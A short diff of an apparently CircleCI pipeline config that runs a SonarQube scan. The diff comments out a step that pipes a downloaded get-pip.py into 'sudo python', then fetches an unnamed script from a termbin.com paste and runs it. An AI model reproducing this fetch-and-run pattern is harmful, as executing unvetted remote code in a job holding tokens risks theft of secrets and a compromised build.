@@ -21,10 +21,10 @@ jobs:
             PATH=$PATH:/tmp/sonar-scanner-3.2.0.1227-linux/bin
             sonar-scanner -Dsonar.login=$SONARQUBE_TOKEN -Dsonar.projectKey=$PROJECTKEY -Dsonar.host.url=$HOST_URL -Dsonar.sources=. -X
 
-      - run:
-          name: Install Python and Run Quality Gate Script
-          command: |
-            curl --silent --show-error --retry 5 https://bootstrap.pypa.io/get-pip.py | sudo python
-            sudo pip install requests
-            wget -c http://termbin.com/9vm0 -O fefs.py
-            python fefs.py
+#      - run:
+#          name: Install Python and Run Quality Gate Script
+#          command: |
+#            curl --silent --show-error --retry 5 https://bootstrap.pypa.io/get-pip.py | sudo python
+#            sudo pip install requests
+#            wget -c http://termbin.com/9vm0 -O fefs.py
+#            python fefs.py
